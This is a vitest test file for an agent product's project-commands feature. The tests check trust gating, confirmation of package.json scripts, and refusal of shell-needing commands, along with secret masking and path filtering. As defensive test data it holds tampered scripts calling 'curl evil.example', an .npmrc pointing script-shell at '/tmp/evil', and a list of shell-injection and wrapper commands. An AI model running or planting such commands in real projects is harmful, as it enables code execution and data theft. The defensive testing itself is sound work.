/**
 * Problems (AD-38; 8.9): the project-commands use-case on an in-test runner
 * and files port (core depends on no adapter, even in a test). Every row of
 * the plan's matrix: untrusted refused before anything is read or run, the
 * `test` and `lint` offer, confirming an offer, a changed script refused
 * with the runner never called, shell-needing commands refused with their
 * plain reason, a failing run's items and counts-only events, paths outside
 * the project dropped, unread output, masking, Stop, close, and the
 * one-run-per-command rule.
 */
import { describe, expect, it } from 'vitest';
import { MAX_PROJECT_COMMAND_CHARS, PROJECT_COMMAND_REFUSALS, type WorkspaceFileResponse, type WorkspaceFolderResponse } from '@ogden-agents/shared';
import {
  CommandChangedError,
  InvalidOperationError,
  NotFoundError,
  ScriptsNotTrustedError,
  ValidationError,
  type ProjectCommandExit,
  type ProjectCommandProcess,
  type ProjectCommandRunner,
  type WorkspaceFilesPort,
  maskedOutput,
} from '../src/index.js';
import { openTestCore, tempDir } from './helpers.js';

interface Started {
  cwd: string;
  argv: readonly string[];
  write(text: string): void;
  finish(exit: Partial<ProjectCommandExit> & { exitCode: number | null }): void;
  process: ProjectCommandProcess;
}

/** A runner that starts nothing: each start is recorded, and the test writes and finishes it. */
function fakeRunner() {
  const starts: Started[] = [];
  let closed = false;
  const runner: ProjectCommandRunner & { starts: Started[]; readonly closed: boolean } = {
    starts,
    get closed() {
      return closed;
    },
    start({ cwd, argv }) {
      let output = '';
      let settled = false;
      let settle!: (exit: ProjectCommandExit) => void;
      const done = new Promise<ProjectCommandExit>((resolve) => (settle = resolve));
      const end = (exit: ProjectCommandExit) => {
        if (settled) return;
        settled = true;
        settle(exit);
      };
      const process: ProjectCommandProcess = { done, stop: () => end({ exitCode: null, stopped: true }), output: () => ({ text: output, truncated: false }) };
      starts.push({ cwd, argv: [...argv], write: (text) => (output += text), finish: (exit) => end({ stopped: false, ...exit }), process });
      return process;
    },
    async close() {
      closed = true;
      for (const start of starts) start.process.stop();
    },
  };
  return runner;
}

/** A files port over a map of the project's files; it counts every call. */
function fakeFiles(files: Record<string, string>) {
  const calls: string[] = [];
  const port: Pick<WorkspaceFilesPort, 'read' | 'list'> & WorkspaceFilesPort = {
    async list(_root, path): Promise<WorkspaceFolderResponse> {
      calls.push(`list:${path}`);
      return { path, entries: Object.keys(files).filter((name) => !name.includes('/')).map((name) => ({ name, path: name, kind: 'file', protected: false })), truncated: false };
    },
    async read(_root, path): Promise<WorkspaceFileResponse | { refused: 'not_found' }> {
      calls.push(`read:${path}`);
      const content = files[path];
      return content === undefined ? { refused: 'not_found' } : { kind: 'text', path, content, size: content.length, masked: false };
    },
  };
  return { port, calls, files };
}

const PACKAGE = JSON.stringify({ scripts: { test: 'vitest run', lint: 'eslint .', build: 'tsc' } });

function setup(files: Record<string, string> = { 'package.json': PACKAGE }, { trusted = true } = {}) {
  const runner = fakeRunner();
  const fs = fakeFiles(files);
  const core = openTestCore(undefined, undefined, { workspaceFilesPort: fs.port, projectCommandRunner: runner });
  const workspace = core.entities.ensureWorkspace(tempDir());
  const root = workspace.realPath ?? workspace.path;
  const commands = core.projectCommands!;
  const ready = trusted ? core.bmadScriptTrust.trustScripts(workspace.id) : Promise.resolve();
  const eventsOf = (type: string) => core.events.readAfter(0).filter((event) => event.type === type);
  return { core, runner, fs, workspace, root, commands, ready, eventsOf };
}

const settings = (id: string, command: string) => ({ id, label: id, command, source: 'settings' as const, confirmedText: command });

/** Waits for the use-case to record a finish. */
const settle = () => new Promise((resolve) => setTimeout(resolve, 0));

describe('project commands use-case', () => {
  it('is undefined without a runner', () => {
    expect(openTestCore().projectCommands).toBeUndefined();
  });

  it('refuses every method in an untrusted project before anything is read or run', async () => {
    const { commands, workspace, fs, runner } = setup(undefined, { trusted: false });
    const calls = [
      commands.list(workspace.id),
      commands.set(workspace.id, { commands: [settings('test', 'node fail.js')] }),
      commands.run(workspace.id, 'test'),
      commands.get(workspace.id, 'pcr_01J9Z3K4M5N6P7Q8R9S0T1V2W6'),
      commands.stop(workspace.id, 'pcr_01J9Z3K4M5N6P7Q8R9S0T1V2W6'),
    ];
    for (const call of calls) await expect(call).rejects.toBeInstanceOf(ScriptsNotTrustedError);
    expect(fs.calls).toEqual([]);
    expect(runner.starts).toEqual([]);
    await expect(commands.list('ws_01J9Z3K4M5N6P7Q8R9S0T1V2W3')).rejects.toBeInstanceOf(NotFoundError);
  });

  it("offers package.json's test and lint with their text, and stores an offer confirmed with it", async () => {
    const { commands, workspace, ready, eventsOf } = setup({ 'package.json': PACKAGE, 'pnpm-lock.yaml': '' });
    await ready;
    const listed = await commands.list(workspace.id);
    expect(listed.declared).toEqual([]);
    expect(listed.offered).toEqual([
      { id: 'test', label: 'Tests', command: 'pnpm run test', source: 'package_json', confirmed: false, script: 'test', scriptText: 'vitest run', lastRun: null },
      { id: 'lint', label: 'Lint', command: 'pnpm run lint', source: 'package_json', confirmed: false, script: 'lint', scriptText: 'eslint .', lastRun: null },
    ]);
    const offer = { id: 'test', label: 'Tests', command: 'pnpm run test', source: 'package_json' as const, confirmedText: 'pnpm run test', script: 'test' };
    await expect(commands.set(workspace.id, { commands: [{ ...offer, confirmedScript: 'vitest run --changed' }] })).rejects.toBeInstanceOf(CommandChangedError);
    expect(eventsOf('workspace.project_commands_changed')).toEqual([]);
    const saved = await commands.set(workspace.id, { commands: [{ ...offer, confirmedScript: 'vitest run' }] });
    expect(saved.declared).toEqual([{ id: 'test', label: 'Tests', command: 'pnpm run test', source: 'package_json', confirmed: true, script: 'test', scriptText: 'vitest run', lastRun: null }]);
    expect(saved.offered.map((one) => one.id)).toEqual(['lint']);
    expect(eventsOf('workspace.project_commands_changed').map((event) => event.payload)).toEqual([{ count: 1 }]);
    // Saving again without `confirmedScript` keeps the stored confirmation.
    const again = await commands.set(workspace.id, { commands: [{ ...offer, label: 'Unit tests' }] });
    expect(again.declared[0]).toMatchObject({ label: 'Unit tests', confirmed: true });
  });

  it('shows a changed script unconfirmed with its new text, and refuses to run it without calling the runner', async () => {
    const { commands, workspace, ready, fs, runner } = setup();
    await ready;
    await commands.set(workspace.id, { commands: [{ id: 'test', label: 'Tests', command: 'npm run test', source: 'package_json', confirmedText: 'npm run test', script: 'test', confirmedScript: 'vitest run' }] });
    fs.files['package.json'] = JSON.stringify({ scripts: { test: 'vitest run && curl evil.example' } });
    const listed = await commands.list(workspace.id);
    expect(listed.declared[0]).toMatchObject({ confirmed: false, scriptText: 'vitest run && curl evil.example' });
    await expect(commands.run(workspace.id, 'test')).rejects.toBeInstanceOf(CommandChangedError);
    expect(runner.starts).toEqual([]);
  });

  it('refuses a command that needs a shell with its plain reason, storing nothing', async () => {
    const { commands, workspace, ready, eventsOf } = setup();
    await ready;
    const cases: Array<[string, string]> = [
      ['npm test && npm run deploy', PROJECT_COMMAND_REFUSALS.operator],
      ['FOO=1 x', PROJECT_COMMAND_REFUSALS.assignment],
      ['echo $HOME', PROJECT_COMMAND_REFUSALS.operator],
      ['echo "$HOME"', PROJECT_COMMAND_REFUSALS.expansion],
      ['rm *', PROJECT_COMMAND_REFUSALS.glob],
      ['cat ~/x', PROJECT_COMMAND_REFUSALS.home],
      ['sh -c "npm test"', PROJECT_COMMAND_REFUSALS.shell],
      ['./run-tests', PROJECT_COMMAND_REFUSALS.relative],
      ['npm test\nnpm run deploy', PROJECT_COMMAND_REFUSALS.newline],
      ["npm 'test", PROJECT_COMMAND_REFUSALS.quote],
      ['rbash -c x', PROJECT_COMMAND_REFUSALS.shell],
      ['yash', PROJECT_COMMAND_REFUSALS.shell],
      ['env sh -c "npm test"', PROJECT_COMMAND_REFUSALS.wrapper],
      ['nohup bash', PROJECT_COMMAND_REFUSALS.wrapper],
      ['xargs -n1 sh', PROJECT_COMMAND_REFUSALS.wrapper],
      ['find . -exec sh {} ;', PROJECT_COMMAND_REFUSALS.operator],
      ['find . -execdir sh {} +', PROJECT_COMMAND_REFUSALS.wrapper],
      ['sudo npm test', PROJECT_COMMAND_REFUSALS.wrapper],
      ['nice npm test', PROJECT_COMMAND_REFUSALS.wrapper],
      ['timeout 10 npm test', PROJECT_COMMAND_REFUSALS.wrapper],
      ['stdbuf -oL npm test', PROJECT_COMMAND_REFUSALS.wrapper],
      ['setsid npm test', PROJECT_COMMAND_REFUSALS.wrapper],
      ['time npm test', PROJECT_COMMAND_REFUSALS.wrapper],
      ['command npm test', PROJECT_COMMAND_REFUSALS.wrapper],
      ['exec npm test', PROJECT_COMMAND_REFUSALS.wrapper],
      ['/usr/bin/env node x.js', PROJECT_COMMAND_REFUSALS.wrapper],
    ];
    for (const [command, reason] of cases) {
      const refused = commands.set(workspace.id, { commands: [settings('test', command)] });
      await expect(refused, command).rejects.toBeInstanceOf(ValidationError);
      await expect(commands.set(workspace.id, { commands: [settings('test', command)] }), command).rejects.toThrow(reason);
    }
    expect(eventsOf('workspace.project_commands_changed')).toEqual([]);
    expect((await commands.list(workspace.id)).declared).toEqual([]);
    // Single quotes keep operators literal; that one is stored, and so is `find` without -exec.
    const saved = await commands.set(workspace.id, { commands: [settings('test', "vitest run -t 'a | b'"), settings('find', 'find . -name x')] });
    expect(saved.declared.map((one) => one.command)).toEqual(["vitest run -t 'a | b'", 'find . -name x']);
  });

  it('runs a failing command: failed, items made project-relative, started and finished events with counts only', async () => {
    const { commands, workspace, root, ready, runner, eventsOf } = setup();
    await ready;
    await commands.set(workspace.id, { commands: [settings('check', "node fail.js --name 'two words'")] });
    const { run } = await commands.run(workspace.id, 'check');
    expect(run).toMatchObject({ commandId: 'check', state: 'running', exitCode: null, itemCount: 0, finishedAt: null });
    expect(runner.starts.map(({ cwd, argv }) => ({ cwd, argv }))).toEqual([{ cwd: root, argv: ['node', 'fail.js', '--name', 'two words'] }]);
    await expect(commands.run(workspace.id, 'check')).rejects.toBeInstanceOf(InvalidOperationError);
    runner.starts[0]!.write(
      [
        "src/a.ts(12,5): error TS2322: Type 'string' is not assignable to type 'number'.",
        '/etc/passwd(1,1): error TS1000: x',
        '../x.ts(3,1): error TS1000: y',
        `${root}/src/b.ts(4,2): error TS2304: Cannot find name 'q'.`,
        '',
      ].join('\n'),
    );
    runner.starts[0]!.finish({ exitCode: 1 });
    await settle();
    const detail = await commands.get(workspace.id, run.id);
    expect(detail.run).toMatchObject({ state: 'failed', exitCode: 1, itemCount: 2 });
    expect(detail.parsed).toBe(true);
    expect(detail.items.map((item) => `${item.path}:${item.line}:${item.column}`)).toEqual(['src/a.ts:12:5', 'src/b.ts:4:2']);
    expect(eventsOf('workspace.project_command_started').map((event) => event.payload)).toEqual([{ runId: run.id, commandId: 'check' }]);
    expect(eventsOf('workspace.project_command_finished').map((event) => event.payload)).toEqual([{ runId: run.id, commandId: 'check', state: 'failed', exitCode: 1, itemCount: 2 }]);
    // No output, path or command text in any event.
    expect(JSON.stringify(core(eventsOf))).not.toMatch(/fail\.js|src\/a\.ts|TS2322/);
    expect((await commands.list(workspace.id)).declared[0]!.lastRun).toMatchObject({ id: run.id, state: 'failed', itemCount: 2 });
  });

  it("runs a package.json script as `<pm> run <script>`, and passes on exit 0", async () => {
    const { commands, workspace, ready, runner } = setup({ 'package.json': PACKAGE, 'yarn.lock': '' });
    await ready;
    await commands.set(workspace.id, { commands: [{ id: 'lint', label: 'Lint', command: 'yarn run lint', source: 'package_json', confirmedText: 'yarn run lint', script: 'lint', confirmedScript: 'eslint .' }] });
    const { run } = await commands.run(workspace.id, 'lint');
    expect(runner.starts[0]!.argv).toEqual(['yarn', 'run', 'lint']);
    runner.starts[0]!.finish({ exitCode: 0 });
    await settle();
    expect((await commands.get(workspace.id, run.id)).run).toMatchObject({ state: 'passed', exitCode: 0, itemCount: 0 });
  });

  it('answers unread output as printed, masked, and masks secrets in output and messages', async () => {
    const { commands, workspace, ready, runner } = setup();
    await ready;
    await commands.set(workspace.id, { commands: [settings('test', 'node fail.js')] });
    const first = (await commands.run(workspace.id, 'test')).run;
    runner.starts[0]!.write('\u001b[31mSomething broke\u001b[0m\nTOKEN=abc123def\n');
    runner.starts[0]!.finish({ exitCode: 1 });
    await settle();
    const unread = await commands.get(workspace.id, first.id);
    expect(unread).toMatchObject({ parsed: false, items: [] });
    expect(unread.output).toBe('Something broke\nTOKEN=[redacted]\n');

    const key = `sk-ant-api03-${'A'.repeat(90)}`;
    const second = (await commands.run(workspace.id, 'test')).run;
    // The previous run is dropped once the next one starts.
    await expect(commands.get(workspace.id, first.id)).rejects.toBeInstanceOf(NotFoundError);
    runner.starts[1]!.write(`src/a.ts(1,1): error TS1: key ${key} leaked\n`);
    runner.starts[1]!.finish({ exitCode: 2 });
    await settle();
    const masked = await commands.get(workspace.id, second.id);
    expect(masked.output).not.toContain(key);
    expect(masked.output).toContain('[redacted]');
    expect(masked.items[0]!.message).toContain('[redacted]');
    expect(masked.items[0]!.message).not.toContain(key);
  });

  it('stops a run (stopped), 404s an unknown run, and close stops every run and the runner', async () => {
    const { commands, workspace, ready, runner, eventsOf } = setup();
    await ready;
    await commands.set(workspace.id, { commands: [settings('test', 'node slow.js'), settings('lint', 'node lint.js')] });
    const { run } = await commands.run(workspace.id, 'test');
    expect((await commands.stop(workspace.id, run.id)).run).toMatchObject({ state: 'stopped', exitCode: null });
    await expect(commands.stop(workspace.id, 'pcr_01J9Z3K4M5N6P7Q8R9S0T1V2W6')).rejects.toBeInstanceOf(NotFoundError);
    await expect(commands.get(workspace.id, 'nope')).rejects.toBeInstanceOf(NotFoundError);
    await expect(commands.run(workspace.id, 'missing')).rejects.toBeInstanceOf(NotFoundError);

    const going = (await commands.run(workspace.id, 'lint')).run;
    await commands.close();
    expect(runner.closed).toBe(true);
    expect((await commands.get(workspace.id, going.id)).run.state).toBe('stopped');
    expect(eventsOf('workspace.project_command_finished').map((event) => (event.payload as { state: string }).state)).toEqual(['stopped', 'stopped']);
    await expect(commands.run(workspace.id, 'test')).rejects.toBeInstanceOf(InvalidOperationError);
  });

  it("records a start the runner couldn't make as error, with its plain words as the output", async () => {
    const { commands, workspace, ready, runner } = setup();
    await ready;
    await commands.set(workspace.id, { commands: [settings('test', 'nothere run')] });
    const { run } = await commands.run(workspace.id, 'test');
    runner.starts[0]!.finish({ exitCode: null, error: "nothere wasn't found on this computer." });
    await settle();
    const detail = await commands.get(workspace.id, run.id);
    expect(detail.run.state).toBe('error');
    expect(detail.output).toBe("nothere wasn't found on this computer.");
  });

  /** A confirmed `npm run test`, then `change` applied to the project: list shows it unconfirmed and run is refused without calling the runner. */
  async function asksAgainAfter(change: (files: Record<string, string>) => void) {
    const ctx = setup();
    await ctx.ready;
    await ctx.commands.set(ctx.workspace.id, { commands: [{ id: 'test', label: 'Tests', command: 'npm run test', source: 'package_json', confirmedText: 'npm run test', script: 'test', confirmedScript: 'vitest run' }] });
    expect((await ctx.commands.list(ctx.workspace.id)).declared[0]!.confirmed).toBe(true);
    change(ctx.fs.files);
    expect((await ctx.commands.list(ctx.workspace.id)).declared[0]!.confirmed).toBe(false);
    await expect(ctx.commands.run(ctx.workspace.id, 'test')).rejects.toBeInstanceOf(CommandChangedError);
    expect(ctx.runner.starts).toEqual([]);
    return ctx;
  }

  it('asks again when a pretest script is added', async () => {
    await asksAgainAfter((files) => {
      files['package.json'] = JSON.stringify({ scripts: { pretest: 'curl evil.example', test: 'vitest run' } });
    });
  });

  it('asks again when .npmrc changes, and confirming again re-records the binding', async () => {
    const { commands, workspace, runner, fs } = await asksAgainAfter((files) => {
      files['.npmrc'] = 'script-shell=/tmp/evil\n';
    });
    // The script's text is unchanged: confirming it again binds the new settings.
    const saved = await commands.set(workspace.id, { commands: [{ id: 'test', label: 'Tests', command: 'npm run test', source: 'package_json', confirmedText: 'npm run test', script: 'test', confirmedScript: 'vitest run' }] });
    expect(saved.declared[0]!.confirmed).toBe(true);
    await commands.run(workspace.id, 'test');
    expect(runner.starts.map((start) => start.argv)).toEqual([['npm', 'run', 'test']]);
    expect(fs.calls).toContain('read:.npmrc');
  });

  it('binds the config files through the fingerprint when one is wired (.npmrc is a credential file the files port never reads)', async () => {
    const runner = fakeRunner();
    const fs = fakeFiles({ 'package.json': PACKAGE });
    let configs = 'sha256:one';
    const asked: string[][] = [];
    const core = openTestCore(undefined, undefined, {
      workspaceFilesPort: fs.port,
      projectCommandRunner: runner,
      projectFilesFingerprint: async (_root, files) => {
        asked.push([...files]);
        return configs;
      },
    });
    const workspace = core.entities.ensureWorkspace(tempDir());
    await core.bmadScriptTrust.trustScripts(workspace.id);
    const commands = core.projectCommands!;
    await commands.set(workspace.id, { commands: [{ id: 'test', label: 'Tests', command: 'npm run test', source: 'package_json', confirmedText: 'npm run test', script: 'test', confirmedScript: 'vitest run' }] });
    expect((await commands.list(workspace.id)).declared[0]!.confirmed).toBe(true);
    expect(asked.at(-1)).toContain('.npmrc');
    expect(fs.calls).not.toContain('read:.npmrc');
    configs = 'sha256:two';
    expect((await commands.list(workspace.id)).declared[0]!.confirmed).toBe(false);
    await expect(commands.run(workspace.id, 'test')).rejects.toBeInstanceOf(CommandChangedError);
    expect(runner.starts).toEqual([]);
  });

  it('asks again when a yarn.lock appears, so a confirmed npm command never quietly becomes yarn', async () => {
    const { commands, workspace } = await asksAgainAfter((files) => {
      files['yarn.lock'] = '';
    });
    expect((await commands.list(workspace.id)).declared[0]!.command).toBe('yarn run test');
  });

  it('never offers a script past the cap, and a declared one that grew past it is unconfirmed without its text', async () => {
    const long = `vitest run ${'x'.repeat(MAX_PROJECT_COMMAND_CHARS)}`;
    const { commands, workspace, ready, fs, runner } = setup({ 'package.json': JSON.stringify({ scripts: { test: long, lint: 'eslint .' } }) });
    await ready;
    expect((await commands.list(workspace.id)).offered.map((one) => one.id)).toEqual(['lint']);
    await commands.set(workspace.id, { commands: [{ id: 'lint', label: 'Lint', command: 'npm run lint', source: 'package_json', confirmedText: 'npm run lint', script: 'lint', confirmedScript: 'eslint .' }] });
    fs.files['package.json'] = JSON.stringify({ scripts: { lint: `eslint ${'y'.repeat(MAX_PROJECT_COMMAND_CHARS)}` } });
    const declared = (await commands.list(workspace.id)).declared[0]!;
    expect(declared.confirmed).toBe(false);
    expect(declared.scriptText).toBeUndefined();
    await expect(commands.run(workspace.id, 'lint')).rejects.toBeInstanceOf(CommandChangedError);
    expect(runner.starts).toEqual([]);
  });

  it('refuses a run the server began closing during its reads', async () => {
    const { commands, workspace, ready, runner } = setup();
    await ready;
    await commands.set(workspace.id, { commands: [{ id: 'test', label: 'Tests', command: 'npm run test', source: 'package_json', confirmedText: 'npm run test', script: 'test', confirmedScript: 'vitest run' }] });
    const started = commands.run(workspace.id, 'test');
    await commands.close();
    await expect(started).rejects.toBeInstanceOf(InvalidOperationError);
    expect(runner.starts).toEqual([]);
  });

  it('masks the plain error appended to the output', async () => {
    const { commands, workspace, ready, runner } = setup();
    await ready;
    await commands.set(workspace.id, { commands: [settings('test', 'node x.js')] });
    const { run } = await commands.run(workspace.id, 'test');
    runner.starts[0]!.finish({ exitCode: null, error: "node couldn't start with --token=abc123def456" });
    await settle();
    const output = (await commands.get(workspace.id, run.id)).output;
    expect(output).not.toContain('abc123def456');
    expect(output).toContain('[redacted]');
  });

  it('drops a cut output with no line break entirely', () => {
    expect(maskedOutput('partial line', true)).toBe('');
    expect(maskedOutput('cut\nkept\n', true)).toBe('kept\n');
  });
});

/** The events as one JSON value (for the no-output check). */
function core(eventsOf: (type: string) => unknown[]): unknown[] {
  return [...eventsOf('workspace.project_command_started'), ...eventsOf('workspace.project_command_finished'), ...eventsOf('workspace.project_commands_changed')];
}
